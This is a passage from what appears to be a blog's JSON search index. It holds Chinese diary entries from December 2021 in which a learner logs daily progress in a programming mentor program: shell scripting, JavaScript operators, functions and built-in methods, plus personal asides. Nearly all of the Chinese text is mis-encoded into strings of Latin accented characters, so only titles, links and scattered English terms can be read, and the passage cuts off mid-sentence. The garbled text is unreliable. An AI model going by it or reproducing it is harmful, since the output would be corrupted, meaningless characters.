åœ¨å­¸ä»€éº¼ï¼Œéš¨æ™‚éƒ½è¦æª¢è¦–è‡ªå·±çš„å•é¡Œï¼Œæ‰¾å‡ºè‡ªå·²çš„å•é¡Œåœ¨å“ªè£¡ï¼Œè©¦è‘—æŠŠé€™äº›å•é¡Œçµ¦æ”¹å–„ã€‚æ˜¯æˆ‘å¥³æœ‹å‹å¸¸å¸¸æœƒå‘Šè¨´æˆ‘çš„ä¸€äº›è©±ï¼Œä¹Ÿæ˜¯æˆ‘è¦ºå¾—æœ€é›£åšåˆ°çš„äº‹æƒ…ã€‚ ç¾åœ¨çš„æˆ‘ä¹Ÿè¨±é‚„æ˜¯å¾ˆä¸å¤ æ¸…æ¥šè‡ªå·±çš„å•é¡Œï¼Œä½†æˆ‘æœƒè©¦è‘—é€™äº›äº‹æƒ…éƒ½ç´€éŒ„ä¸‹ä¾†ï¼Œæ™‚æ™‚åˆ»åˆ»æé†’è‡ªå·±ä¸è¦å¿˜äº†éå»çš„è‡ªå·±æ›¾ç¶“çŠ¯ä¸‹äº†å“ªäº›éŒ¯èª¤ã€‚ é¡Œå¤–è©±ä»Šå¤©è·Ÿå¥³æœ‹å‹ä¸€èµ·ç…®äº†æ™šé¤ï¼Œæ™šé¤ç…®äº†è”¬èœå‘³å™Œæ¹¯è”¬èœéºµï¼ˆæ»¿æ»¿çš„è”¬èœï¼‰ã€‚ç¸½è¦ºå¾—é€™æ˜¯ä¸€å¤©ç¹å¿™ä¹‹ä¸­çš„çŸ­æš«å¹¸ç¦æ™‚å…‰ï¼Œé›–ç„¶å¸Œæœ›è‡ªå·±èƒ½è®Šå¾—è¶Šä¾†è¶Šå¼·ï¼Œä½†åœ¨èŠ±æ™‚é–“åŠªåŠ›å­¸ç¿’çš„éç¨‹ä¹Ÿå°‘äº†å¾ˆå¤šå¯ä»¥é™ªä¼´å¥³æœ‹å‹çš„æ™‚é–“ï¼Œæœ‰ä¸€é»å‚·å¿ƒã€‚ å¸Œæœ›æœªä¾†è‡ªå·±çœŸçš„è®Šå¼·ä¹‹å¾Œï¼Œå¯ä»¥æœ‰æ›´å¤šçš„æ™‚é–“é™ªä¼´å¥³æœ‹å‹ï¼Œå…©å€‹äººé–‹é–‹å¿ƒå¿ƒçš„éæ—¥å­ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ week1 çš„ä½œæ¥­å®Œæˆï¼ŒæŒ‘æˆ°é¡Œçš„éƒ¨åˆ†å¸Œæœ›ä¹Ÿå¯ä»¥è©¦è‘—å»å˜—è©¦çœ‹èƒ½ä¸èƒ½åšå‡ºä¾†ã€‚ç•¶æˆ‘è¶Šä¾†è¶Šé€²å…¥ç‹€æ³å¾Œï¼Œå¸Œæœ›æˆ‘çš„é€Ÿåº¦ä¹Ÿèƒ½æ…¢æ…¢è·Ÿè‘—åŠ é€Ÿã€‚","link":"/2021/12/15/mentor-program-day04/"},{"title":"mentor-program-day06","text":"é€²å…¥åˆ°æ–°é€²åº¦çš„ä¸€å¤© é€²åº¦ä»Šå¤©æŠŠ week1 çš„æŒ‘æˆ°é¡Œçµ¦åšå®Œäº†ï¼šnum.shï¼Œä¹Ÿå­¸åˆ°äº†ä¸€é»åŸºç¤çš„ shell script èªæ³•ï¼Œè·Ÿåšäº†ç°¡å–®çš„ç­†è¨˜ï¼šæˆ‘çš„ç¬¬ä¸€å€‹ Shell Scriptã€‚ æœ¬ä¾†æƒ³æŠŠè¶…ç´šæŒ‘æˆ°é¡Œä¹Ÿçµ¦åšå®Œï¼Œä½†æ˜¯æ€•è‡ªå·±èŠ±å¤ªå¤šæ™‚é–“è€Œå»¶å¾Œäº†é€²åº¦ï¼Œæ‰€ä»¥ç›®å‰åªç ”ç©¶äº†ä¸€åŠã€‚å¸Œæœ›ä¹‹å¾Œæœ‰æ™‚é–“å†æ…¢æ…¢æŠŠå®ƒçµ¦å®Œæˆã€‚ ä»Šå¤©çµ‚æ–¼é€²å…¥åˆ° week2 çš„é€²åº¦äº†ï¼Œç›®å‰æŠŠã€Œ[JS101]ç”¨ JavaScript ä¸€æ­¥æ­¥æ‰“é€ ç¨‹å¼åŸºç¤ã€çœ‹åˆ° 21% ï¼Œä¹Ÿä¾ç…§æ…£ä¾‹åšäº†ç­†è¨˜ï¼š å¾ˆæœ‰è¶£çš„ä½ç§»é‹ç®—å­èˆ‡ä½å…ƒé‹ç®— å¾ Object çš„ç­‰è™Ÿä¾†çœŸæ­£ç†è§£è®Šæ•¸ é›–ç„¶åšç­†è¨˜æœƒæ¯”è¼ƒèŠ±æ™‚é–“ï¼Œä½†æˆ‘è‡ªå·±è¦ºå¾—é€™å°å­¸ç¿’è »æœ‰å¹«åŠ©çš„ï¼Œæ‰€ä»¥é‚„æ˜¯æœƒæŠŠè¦ºå¾—ä¸éŒ¯çš„æ±è¥¿çµ¦ç­†è¨˜ä¸‹ä¾†ã€‚ å­¸åˆ°çš„äº‹æƒ…å…¶å¯¦ä»Šå¤©å­¸åˆ°çš„æ±è¥¿éƒ½å¾ˆç²¾å½©ï¼Œç‰¹åˆ¥æ˜¯ã€Œä½ç§»é‹ç®—ã€è·Ÿã€Œä½å…ƒé‹ç®—ã€é€™å…©å€‹æ±è¥¿ã€‚é‚„è¨˜å¾—ä»¥å‰åœ¨åš LidemyOJ çš„æ™‚å€™æœ‰æåˆ°é€™å€‹æ±è¥¿ï¼Œä½†ç•¶æ™‚åœ¨æª¢è¨å®Œå¾Œå°±æ²’æœ‰ç¹¼çºŒç ”ç©¶ä¸‹å»ï¼Œæ‰€ä»¥æ²’æŠŠé€™å€‹å¾ˆæ½®çš„æŠ€å·§å­¸èµ·ä¾†ï¼Œç¾åœ¨æƒ³æƒ³å…¶å¯¦é‚„è »å¯æƒœçš„ã€‚ å¦å¤–ä¸€å€‹æ±è¥¿æ˜¯ã€Œè®Šæ•¸çœŸæ­£çš„æ¦‚å¿µã€ï¼Œé€™å€‹æ±è¥¿ä»¥å‰ä¹Ÿæå¾—æˆ‘è »è±†é ç—›çš„ã€‚ä»¥å‰åœ¨çœ‹æ›¸å­¸çš„æ™‚å€™é›–ç„¶å¾ˆèªçœŸè®€ï¼Œä¸éä¹Ÿä¸çŸ¥é“ç‚ºä»€éº¼ï¼Œç•¶æ™‚çš„æˆ‘å°±æ˜¯æƒ³ä¸é€šï¼Œåˆ†ä¸æ¸…æ¥šåƒè€ƒå€¼è·ŸçœŸçš„å€¼çš„å·®åˆ¥ã€‚ä¸éå¥½åœ¨ä»Šå¤©çœ‹å®Œèª²ç¨‹å¾Œæœ‰å¼„æ¸…æ¥šäº†ã€‚å¸Œæœ›æ¥ä¸‹ä¾†çš„æ—¥å­è£¡å¯ä»¥ä¸€æ­¥ä¸€æ­¥è·Ÿ JavaScript æ‰“å¥½é—œä¿‚ï¼Œé›–ç„¶ä»¥å‰æˆ‘å€‘å¾ˆé™Œç”Ÿï¼Œä½†ç›¸ä¿¡æœ€å¾Œèƒ½æˆç‚ºå¥½æœ‹å‹çš„å§ (ã¤Ğ´âŠ‚)ï¼Ÿ é¡Œå¤–è©±è¦ºå¾—æœ‰å¥è©±å¾ˆæœ‰é“ç†ï¼š å¾ˆå¤šæ™‚å€™ï¼Œä½ å¯èƒ½éƒ½ä¸çŸ¥é“ä½ å­¸çš„é€™äº›æ±è¥¿åœ¨å“ªä¸€å¤©èƒ½ç”¨åˆ°ï¼Œä½†ç¸½æœ‰ä¸€å¤©çªç„¶å°±æœƒæ´¾ä¸Šç”¨å ´ã€‚ åƒæ˜¯ä»Šå¤©èƒ½æŠŠã€Œä½å…ƒé‹ç®—ã€è·Ÿã€Œä½ç§»é‹ç®—ã€çµ¦å­¸çš„å¾ˆå®Œæ•´ï¼Œæœ‰ä¸€éƒ¨ä»½è¦æ„Ÿè¬æˆ‘å‰é™£å­çœ‹äº† Crash Course Computer Science çš„èª²ç¨‹ã€‚å…¶å¯¦æˆ‘æ²’æœ‰å…¨éƒ¨çœ‹å®Œï¼Œå¤§æ¦‚åªçœ‹åˆ°ç¬¬åé›†è€Œå·²ï¼Œä½†å¾ˆå·§çš„æ˜¯æ­£å¥½è£¡é¢æœ‰æåˆ°é—œæ–¼ä½å…ƒé‹ç®—çš„æ¦‚å¿µã€‚ åŸæœ¬åœ¨çœ‹çš„æ™‚å€™ä¹Ÿæœƒæƒ³èªªï¼Œé›–ç„¶é€™äº›æ±è¥¿ç¢ºå¯¦è·Ÿé›»è…¦é‚„æŒºç›¸é—œçš„ï¼Œä¸éæœ‰äº›æ™‚å€™é‚„çœŸçš„ä¸çŸ¥é“é€™äº›æ±è¥¿åœ¨å­¸ç¿’ç¨‹å¼ä¸Šèƒ½å¸¶ä¾†ä»€éº¼å¹«åŠ©ï¼Œçµæœä»Šå¤©å¾ˆå·§çš„ç”¨åˆ°äº†é€™äº›ç›¸é—œçš„çŸ¥è­˜ï¼Œè¦ºå¾—å¾ˆç¥å¥‡ã€‚ é‚„æœ‰å¦å¤–ä¸€å€‹å°±æ˜¯è®Šæ•¸å„²å­˜è¨˜æ†¶é«”ä½å€çš„æ¦‚å¿µå§ï¼Œè¨˜å¾—ç¬¬ä¸€æ¬¡çœ‹åˆ°é€™å€‹æ¦‚å¿µæ˜¯å¾ C èªè¨€çš„æ•™å­¸æ›¸ä¸Šçœ‹åˆ°çš„ï¼ˆå„˜ç®¡æˆ‘æ ¹æœ¬æ²’æŠŠæŒ‡æ¨™é‚£å€‹ç« ç¯€çµ¦çœ‹å®Œï¼‰ã€‚ é€™äº›æ›¾ç¶“åšéçš„å°äº‹æƒ…ï¼Œå…¶å¯¦éƒ½æœƒç„¡å½¢çš„åœ¨å­¸ç¿’ä¸Šå¸¶ä¾†å¹«åŠ©ï¼Œæˆ‘è¦ºå¾—å¾ˆæœ‰è¶£ã€‚åœ¨é«”æœƒåˆ°é€™äº›å¾Œï¼Œè‡ªå·±ä¹Ÿæ›´é¡˜æ„å»å­¸ç¿’å„ç¨®æ–°æ±è¥¿ï¼Œå°±ç®—æˆ‘ç•¶ä¸‹å¯èƒ½ä¸çŸ¥é“é‚£èƒ½ç‚ºæˆ‘å¸¶ä¾†ä»€éº¼å¹«åŠ©ã€‚ é˜¿å°äº†ï¼Œè½èªªæœ€è¿‘å¿«å†¬è‡³äº†ï¼Œæ‰€ä»¥ä¾†åˆ†äº«ä¸€ä¸‹å¥½åƒçš„æ¹¯åœ“ï¼šå°ä¸¸å­åŒ…é¤¡å°æ¹¯åœ“éº»å‰çµ„ æœŸè¨±å¸Œæœ›æ˜å¤©èƒ½æŠŠ [JS101] çœ‹åˆ° week2 çš„é€²åº¦ï¼Œé‚„æœ‰ [ALG101] è·Ÿ [CS101] ä¹Ÿèƒ½é †ä¾¿çš„è©±æ˜¯æœ€å¥½å›‰ (à¹‘â€¢Ì â‚ƒ â€¢Ì€à¹‘) ä¹Ÿå¸Œæœ›æœ‰æ©Ÿæœƒèƒ½æŠŠ week1 çš„è¶…ç´šæŒ‘æˆ°é¡Œçµ¦ç ”ç©¶å‡ºä¾†ï¼ŒåŠ æ²¹ï¼","link":"/2021/12/17/mentor-program-day06/"},{"title":"mentor-program-day07","text":"ç¬¬ä¸€å€‹ç¦®æ‹œéå»äº†ï½å¥½å¿«ï¼ é€²åº¦ä»Šå¤©æŠŠ week1 çš„ è¶…ç´šæŒ‘æˆ°é¡Œ çµ¦å®Œæˆäº†ï¼Œé›–ç„¶æœ‰åƒè€ƒ Huli è·Ÿä¸€ä½åŒå­¸çš„è§£ç­”ï¼Œä¸éä¹Ÿæ˜¯æœ‰æŠŠæ¯å€‹æŒ‡ä»¤çš„æ„æ€çµ¦å¼„æ‡‚æ‰è‡ªå·±ä¸€è¡Œä¸€è¡Œæ•²å‡ºä¾†ã€‚å¸Œæœ›å­¸åˆ°æ›´å¤šçš„æ™‚å€™å¯ä»¥æŠŠå®ƒæ”¹å–„çš„æ›´ç©©å®šå§ï¼Œä¸ç„¶ç›®å‰çš„è§£æ³•ä¸å¤ è°æ˜ã€‚ [JS101] ç›®å‰çœ‹åˆ°äº† 29%ï¼Œè·Ÿæ•´ç†äº†ä¸€äº›ç­†è¨˜ï¼š ++ è·Ÿ â€“ æ”¾å‰é¢å¾Œé¢çš„å·®åˆ¥ é‚è¼¯é‹ç®—ä¸­çš„çŸ­è·¯ JavaScritp ä¸­çš„è³‡æ–™å‹åˆ¥ è®Šæ•¸é‹ç®—æ™‚è©²æ³¨æ„çš„å¹¾ä»¶äº‹ if è·Ÿ if else å¯èƒ½æœƒçŠ¯çš„éŒ¯èª¤ if çš„æ¼”åŒ–å² switch case ä¸‰å…ƒé‹ç®—å­ æœ¬ä¾†ä»¥ç‚ºé€™äº›åŸºç¤çš„æ±è¥¿æ‡‰è©²ä¸æœƒèŠ±æˆ‘å¤ªå¤šæ™‚é–“ï¼Œä½†äº‹å¯¦ç™¼ç¾è‡ªå·±çš„åŸºç¤çœŸçš„æ²’æœ‰æ‰“å¥½å‘€ã€‚ å¸Œæœ›ä¹‹å¾Œçš„é€²åº¦ä¹Ÿèƒ½ç¹¼çºŒé †åˆ©åŸ·è¡Œï¼Œè¦åŠ æ²¹ï½ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å­¸åˆ°çš„æ±è¥¿ä¸»è¦æ˜¯åŸºæœ¬æ¦‚å¿µç‚ºä¸»ï¼Œå¥½ç©çš„åœ°æ–¹æ˜¯å­¸åˆ°äº†ä¸€äº›å°æŠ€å·§ï¼Œåƒæ˜¯ ++/-- çš„æ‡‰ç”¨ã€é‚è¼¯çŸ­è·¯ã€mapping ç­‰ç­‰ã€‚ä¹Ÿç™¼ç¾æœ‰äº›èªæ³•èƒŒå¾Œçš„ä¾†æºå‡ºè‡ªæ–¼äººæ€§çš„æ„Ÿè¦º XDï¼Œå¾ˆæœ‰æ„æ€ï¼Œåƒåœ¨çœ‹æ­·å²ä¸€æ¨£ã€‚ é™¤äº†ç­†è¨˜åšçš„å…§å®¹ä¹‹å¤–ï¼Œä»Šå¤©ä¹Ÿé‡æ–°è¤‡ç¿’äº†è¿´åœˆé€™å€‹æ±è¥¿ã€‚ è¿´åœˆçš„èªªé›£ä¸é›£ï¼Œä½†è¦è¤‡é›œä¹Ÿå¯ä»¥å¾ˆè¤‡é›œã€‚å‰é™£å­åƒåŠ ç«¶è³½æ™‚ï¼Œåœ¨è™•è£¡ API è³‡æ–™çš„æ™‚å€™ï¼Œé‚£å€‹è¿´åœˆå¯¦åœ¨æ˜¯æå¾—è‡ªå·±é ­æšˆç›®çœ© ãƒ½(â˜‰Ğ´âŠ™) è¿´åœˆçš„åº•å­çœŸçš„è¦æ‰“å¥½æ‰è¡Œï¼Œå› ç‚ºå®ƒæ˜¯å€‹å¾ˆé‡è¦ä¹Ÿå¹¾ä¹åˆ°å“ªæœƒç”¨åˆ°çš„æ±è¥¿ã€‚å¸Œæœ›é€™ä¸€æ¬¡èƒ½å¤ å†æŠŠé€™éƒ¨åˆ†çš„åŸºç¤æ‰“å¾—æ›´éå›ºä¸€äº›ã€‚ èµ°åˆ°ç¾åœ¨å·²ç¶“ç¬¬ä¸ƒå¤©äº†ï¼Œè¦ºå¾—ä»¥å‰çš„æˆ‘å¯èƒ½å¤ªç³¾çµä¸€äº›äº‹æƒ…äº†ï¼Œç¸½æœƒæŠŠç°¡å–®çš„äº‹æƒ…æƒ³å¾—å¤ªè¤‡é›œï¼Œä½†å…¶å¯¦æ²’æœ‰é€™å€‹å¿…è¦ã€‚é©åº¦çš„ç°¡åŒ–ä¸€äº›æ±è¥¿ï¼Œè®“è‡ªå·±èƒ½å¤ ç†è§£æŸå€‹æ¦‚å¿µæ¯”è¼ƒé‡è¦ï¼Œè¤‡é›œçš„éƒ¨ä»½å¯ä»¥ç­‰è¦ç²¾æ·±çš„æ™‚å€™å†æ…¢æ…¢é‘½ç ”å°±å¥½äº†ï¼Œæˆ‘æƒ³æ˜¯é€™æ¨£å­å§ã€‚ é¡Œå¤–è©±å…¶å¯¦ä»Šå¤©æ˜¯å€‹ç‹€æ³é‚„è »ç³Ÿçš„ä¸€å¤©ï¼Œè·Ÿå¥³æœ‹å‹åµæ¶äº† ï½¡ï¾Ÿ(ï¾ŸÂ´Ï‰`ï¾Ÿ)ï¾Ÿï½¡ æ‰€ä»¥æœ‰é»ç®—æ˜¯ç¡¬è‘—é ­çš®åœ¨é€¼è‡ªå·±å­¸ç¿’ï¼Œå°ˆå¿ƒçš„ç¨‹åº¦ä¹Ÿå¤šå°‘å—äº†ä¸€é»å½±éŸ¿ï¼Œå”‰ï½è¦æŠŠæ¯ä¸€ä»¶äº‹æƒ…éƒ½åšå¥½çœŸçš„ä¸æ˜¯ä»¶å®¹æ˜“çš„äº‹ã€‚ å¿ƒæƒ…ä¸å¥½çš„æ™‚å€™è½è½æ­Œï¼Œæˆ‘è¦ºå¾—æœƒè®“å¿ƒæƒ…ç¨å¾®æ”¾é¬†ä¸€äº›ï¼Œæ‰€ä»¥é †æ‰‹åˆ†äº«ä¸€ä¸‹å¥½æ­Œå›‰ï¼šãƒ¨ãƒ«ã‚·ã‚« - æ˜¥æ³¥æ£’ å¦å¤–å¸Œæœ›æœ‰å¤©èƒ½æŠŠé€™å€‹ç¶ ç¶ çš„æ±è¥¿çµ¦å¡«æ»¿ï¼š ï¼ˆæ„Ÿè¦ºå¾ˆæœ‰æˆå°±æ„Ÿï½ï½ï½ï¼‰ æœŸè¨±å·çœ‹äº†ä¸€ä¸‹é€²åº¦æ¢ï¼Œæ„Ÿè¦ºæ˜å¤©æ²’è¾¦æ³•æŠŠ [JS101] çœ‹å®Œé˜¿â€¦ï¼Œä½†é‚„æ˜¯ç›¡åŠ›å§ï¼","link":"/2021/12/18/mentor-program-day07/"},{"title":"mentor-program-day08","text":"æœ‰é»ç‡’è…¦è¢‹çš„ä¸€å¤©(Â´ï½¥Ï‰ï½¥`) é€²åº¦ä»Šå¤©æŠŠ [JS101] çœ‹åˆ°äº† 36%ï¼Œæœ¬ä¾†ä»¥ç‚ºèƒ½é †åˆ©çœ‹å®Œï¼Œä½† function çš„å…§å®¹æ¯”æˆ‘é æœŸä¸­ä¾†å¾—è¤‡é›œä¸€äº› QQã€‚ é‚„æ˜¯ä¾ç…§æ…£ä¾‹åšäº†ç­†è¨˜ï¼š é‡æ–°èªè­˜è¿´åœˆ ç†è§£ function å‚³éåƒæ•¸çš„æ©Ÿåˆ¶ æŠŠ function ç•¶ä½œåƒæ•¸ å‡½å¼çš„å®£å‘Šæ–¹å¼ å‡½å¼å¡«ç©ºæ³• å‡½å¼ä¸­çš„ arguments ç‰©ä»¶èˆ‡ Array-like Object é€™æ¬¡ç­†è¨˜èŠ±äº†æ¯”è¼ƒå¤šæ™‚é–“ä¾†å¯«ï¼Œä¹Ÿåœ¨éç¨‹ä¸­ç­è§£åˆ°è‡ªå·±è·Ÿ function å¯èƒ½çœŸçš„è »é™Œç”Ÿçš„ï¼Œå¸Œæœ›ä¹‹å¾Œè¦å¥½å¥½æŠŠé€™éƒ¨åˆ†çµ¦åŠ å¼·æ‰è¡Œã€‚ å­¸åˆ°çš„äº‹æƒ…åœ¨å­¸è¿´åœˆçš„æ™‚å€™ï¼Œé«”æœƒåˆ°ä¸€ä»¶äº‹ï¼šè©¦è‘—å»é ˜æ‚Ÿæ¯å€‹èªæ³•èƒŒå¾Œçš„å…§æ¶µï¼Œèƒ½å¤ åŠ æ·±è¨˜æ†¶ã€‚ è¨˜å¾—ç¬¬ä¸€æ¬¡å­¸è¿´åœˆçš„æ™‚å€™ï¼ŒåªçŸ¥é“è¿´åœˆå°±æ˜¯ä¸€ç›´é‡è¤‡åšæŸä»¶äº‹æƒ…çš„èªæ³•ï¼Œè·Ÿæ¯ä¸€ç¨®èªæ³•æœ‰å„è‡ªä¸åŒçš„ç”¨é€”ï¼šwhile é©åˆç”¨åœ¨ç”¨åœ¨ä¸ç¢ºå®šè¦è·‘å¹¾åœˆçš„æƒ…æ³ï¼›do while é©åˆç”¨åœ¨è‡³å°‘åŸ·è¡Œä¸€åœˆçš„æƒ…æ³ï¼›for é©åˆç”¨åœ¨å·²ç¶“ç¢ºå®šæœƒè·‘å¹¾åœˆçš„æƒ…æ³ã€‚ å…¶å¯¦é€™æ¨£çš„å­¸ç¿’æ–¹å¼ä¹Ÿæ²’æœ‰ä»€éº¼ä¸å°ï¼Œåªæ˜¯æˆ‘è¦ºå¾—é ˜æ‚Ÿæ¯”è¼ƒæ²’æœ‰é‚£éº¼æ·±è€Œå·²ã€‚ ä»Šå¤©åœ¨å­¸åˆ° goto èˆ‡ label çš„æ¦‚å¿µä¹‹å¾Œï¼Œå…¶å¯¦ä¹Ÿé«”æœƒåˆ°è¿´åœˆèƒŒå¾Œçš„æ¼”åŒ–éç¨‹ã€‚ä¸è«–æ˜¯å“ªç¨®è¿´åœˆï¼ŒèƒŒå¾Œçš„çµæ§‹éƒ½æ˜¯é¡ä¼¼çš„ï¼Œä¸»è¦çš„å·®åˆ¥åªåœ¨æ–¼ä¸€äº›åŸ·è¡Œé †åºçš„å•é¡Œå§ã€‚ åœ¨ç†è§£é€™äº›å¾Œæˆ‘å°±èƒ½èªªè‡ªå·±éå¸¸æ‡‚å—ï¼Ÿå…¶å¯¦ä¹Ÿä¸æ˜¯ï¼Œåªæ˜¯æœƒè¦ºå¾—è‡ªå·±æœ‰äº†æ›´æ·±çš„ç†è§£ï¼Œä½†æˆ‘ç›¸ä¿¡é€™æ¨£çš„ç†è§£å°æœªä¾†ç¸½æœƒåœ¨æŸå¤©å¸¶çµ¦æˆ‘ç„¡å½¢çš„å¹«åŠ©å§ã€‚ é™¤äº†è¿´åœˆä¹‹å¤–ï¼Œä»Šå¤©ä¹Ÿå­¸ç¿’äº†é—œæ–¼ function çš„çŸ¥è­˜ã€‚æˆ‘è¦ºå¾— function è¦ç°¡å–®å¯ä»¥æƒ³å¾—å¾ˆç°¡å–®ï¼Œä½†è¦è¤‡é›œä¹Ÿå¯ä»¥è¤‡é›œåˆ°ä½ é ­æšˆç›®çœ©ï¼Œæ›å¥è©±èªªå°±æ˜¯æ˜“å­¸é›£ç²¾å§ã€‚ å°±å¥½åƒæˆ‘å¯èƒ½ä»¥ç‚ºæˆ‘æ‡‚ä»€éº¼æ˜¯ callback functionï¼Œä½†å¦‚æœæ›ä¸€ç¨®å¯«æ³•æˆ‘å¯èƒ½å°±æœƒè…¦è¢‹å¡ä½ï¼Œå°±è·Ÿä»Šå¤©ä¸€æ¨£ï¼Œæˆ‘é«”æœƒåˆ°äº†è‡ªå·±å…¶å¯¦æ²’æœ‰å®Œå…¨å¼„æ‡‚çš„é€™ä»¶äº‹ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œé‡è¦çš„é‚„æ˜¯å¤šç·´ç¿’å§ï¼Œä¸€å€‹ function å¯ä»¥å¯«å‡ºçš„è§£æ³•æ°¸é éƒ½ä¸æœƒåªæœ‰ä¸€ç¨®ï¼Œæˆ‘ä¹Ÿä¸å¯èƒ½ä¸€å¤•ä¹‹é–“å°±æŠŠæ¯ç¨®è§£æ³•éƒ½åˆ»åœ¨è…¦æµ·è£¡ã€‚æˆ‘å”¯ä¸€èƒ½åšçš„äº‹æƒ…å°±æ˜¯æ…¢æ…¢ç´¯ç©ç¶“é©—ï¼Œä¸è¦å±€é™åœ¨ä¸€ç¨®åšæ³•ï¼Œç›¡é‡å»æ¢ç´¢å„ç¨®å¯èƒ½ã€‚ é¡Œå¤–è©±ä¸çŸ¥é“æœ‰æ²’æœ‰äººä¹Ÿå–œæ­¡åƒè±†èŠ±ï¼Œæˆ‘è¦ºå¾—è‡ªç”±å¸‚å ´è£¡çš„æœ‰ä¸€é–“å«åšå†·å‡è±†èŠ±çš„è±†èŠ±å¾ˆå¥½åƒï¼Œä½†å¥½åƒæ‰¾ä¸åˆ°åœ°æ¨™æ‰€ä»¥æ²’è¾¦æ³•è²¼åº—å®¶è³‡è¨Šã€‚ æ˜å¤©åˆåˆ°äº†ä¸€å€‹ç¦®æ‹œçš„çµå°¾ï¼Œæœ‰æ–°çš„é¬¼æ»…å¯ä»¥çœ‹ï¼Œé–‹å¿ƒ (â—__â—) æœŸè¨±æ˜å¤©çœŸçš„è©²æŠŠ [JS101] çµ¦çœ‹å®Œï¼Œç„¶å¾Œå¥½å¥½ç·´ç¿’é¡Œç›®ï¼Œä¹Ÿåšä¸€é» week2 çš„ä½œæ¥­ï¼Œé †åˆ©çš„è©±å°±æŠŠ [ALG101] è·Ÿ [CS101] çµ¦è¤‡ç¿’ä¸€ä¸‹ï¼Œå¤§æ¦‚æ˜¯é€™æ¨£ã€‚","link":"/2021/12/18/mentor-program-day08/"},{"title":"mentor-program-day09","text":"é‚Šæ„›çé‚Šç´€éŒ„ã€‚ é€²åº¦ä»Šå¤©æ™šä¸Šè·Ÿå¥³æœ‹å‹å‡ºå»ç´„æœƒäº†ï¼Œæ‰€ä»¥é€²åº¦ä¸å¤šã€‚ [JS101] çœ‹åˆ°äº† 45%ã€‚å…¶å¯¦ä¹Ÿèƒ½ç®—æ˜¯çœ‹å®Œäº†ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†çœ‹èµ·ä¾†ä¸»è¦æ˜¯ç·´ç¿’è·Ÿå¯¦ä½œç‚ºä¸»ã€‚ ç­†è¨˜çš„éƒ¨åˆ†å› ç‚ºé‚„æ²’æœ‰æ™‚é–“æ•´ç†ï¼Œæ‰€ä»¥ä»Šå¤©æ²’æœ‰ï¼Œåªæœ‰å¯«äº†ä¸€å€‹æˆ‘æ—©ä¸Šç„¡èŠæ‹¿ C èªè¨€èµ·ä¾†è®€æ™‚å­¸åˆ°çš„éè¿´å‡½å¼ï¼š å¯¦ä½œéè¿´å‡½å¼ å­¸åˆ°çš„äº‹æƒ…å…ˆè«‡è«‡éè¿´å‡½å¼ã€‚éè¿´å‡½å¼å…¶å¯¦èƒŒå¾Œçš„æ¦‚å¿µè·Ÿè¿´åœˆæœ‰ç•°æ›²åŒå·¥ä¹‹å¦™ã€‚ç›¸åŒçš„åœ°æ–¹åœ¨æ–¼å…©è€…éƒ½éœ€è¦æœ‰ã€Œçµ‚æ­¢æ¢ä»¶ã€ä¾†å¾ç„¡ç·šçš„å¾ªç’°ä¸­è·³å‡ºï¼›åªæ˜¯éè¿´çµ¦äººçš„æ„Ÿè¦ºåˆæ›´æŠ½è±¡äº†ä¸€äº›ã€‚ ä»Šå¤©è¤‡ç¿’äº†å¾ˆå¤š JavaScript ä¸­çš„å…§å»ºå‡½å¼ï¼Œä¹Ÿæœ‰è‡ªå·±å¯¦ä½œäº†å…¶ä¸­å¹¾å€‹ï¼Œä»¥åŠå¾ˆé‡è¦çš„ Immutableï¼ˆä¸å¯è®Šï¼‰ æ¦‚å¿µã€‚ é¡Œå¤–è©±æ˜¨å¤©ç¡å‰æŠŠ C èªè¨€åˆæ‹¿èµ·ä¾†çœ‹äº†ä¸€é»é—œæ–¼ã€ŒæŒ‡æ¨™ã€çš„æ±è¥¿ï¼Œè¦ºå¾—æŒ‡æ¨™æ˜¯å€‹ç¥å¥‡çš„æ±è¥¿ã€‚ å¯æƒœç›®å‰æ¯”è¼ƒæ²’æœ‰å¤šé¤˜çš„æ™‚é–“ä¾†å¯¦ä½œï¼Œå¸Œæœ›ç­‰ä¹‹å¾Œæœ‰æ™‚é–“çš„æ™‚å€™å¯ä»¥ä¾†è¤‡ç¿’ä¸€ä¸‹å¥½ä¹…æ²’ç¢°çš„ CCCCCã€‚ æœŸè¨±æ˜å¤©çš„ç›®æ¨™æ˜¯æŠŠ [JS101] ç·´ç¿’é¡Œçš„éƒ¨ä»½çµ¦åšå®Œï¼Œé‚„æœ‰æŠŠä»Šå¤©å­¸åˆ°çš„æ±è¥¿è©²åšçš„ç­†è¨˜çµ¦å®Œæˆã€‚ å¤ªæ„›çäº†ï¼Œå…ˆä¾†ç¡äº†ï¼Œæ™šå®‰ã€‚","link":"/2021/12/20/mentor-program-day09/"},{"title":"mentor-program-day10","text":"åˆä¾†åˆ°æ–°çš„ä¸€é€±ã€‚ é€²åº¦ä»Šå¤©åŠªåŠ›å¡«å‘ï¼ŒæŠŠæ˜¨å¤©è©²åšçš„ç­†è¨˜éƒ½çµ¦åšå®Œäº†ï¼š function çš„å›å‚³å€¼ è·Ÿæ•¸å­—æœ‰é—œçš„å…§å»ºå‡½å¼ æŠŠæ•¸å­—è½‰å­—ä¸²çš„å…©ç¨®æ–¹æ³• è·Ÿå­—ä¸²æœ‰é—œçš„å…§å»ºå‡½å¼ å­—å…ƒæ˜¯å¯ä»¥æ¯”å¤§å°çš„ é™£åˆ—çš„å…§å»ºå‡½å¼ å¯¦ä½œé™£åˆ—å…§å»ºå‡½å¼ å¯¦ä½œå­—ä¸²å…§å»ºå‡½å¼ Immutable çš„è§€å¿µ å–„ç”¨ console.log ä¾†é™¤éŒ¯ Chorme-devtool çš„å†·çŸ¥è­˜ å¦å¤–ä¹Ÿé †åˆ©æŠŠ [JS101] çœ‹åˆ° week2 çš„é€²åº¦ï¼ˆ55%ï¼‰ï¼Œé‚„æœ‰ week2 çš„ä½œæ¥­ä¹Ÿåšäº†ä¸€äº›ï¼š HW1 HW2 HW3 HW4 HW5 å­¸åˆ°çš„äº‹æƒ…åœ¨åšç­†è¨˜çš„æ™‚å€™ç‰¹åˆ¥æœ‰æ„Ÿè§¸çš„æ˜¯ Immutable çš„æ¦‚å¿µè·Ÿ console.log çš„æ–¹ä¾¿ä¹‹è™•ã€‚ æœ‰æ™‚å€™åœ¨ç”¨å…§å»ºå‡½å¼çš„æ™‚å€™çœŸçš„æœƒä¸å°å¿ƒå¯«å‡ºåƒæ˜¯ a.toString() 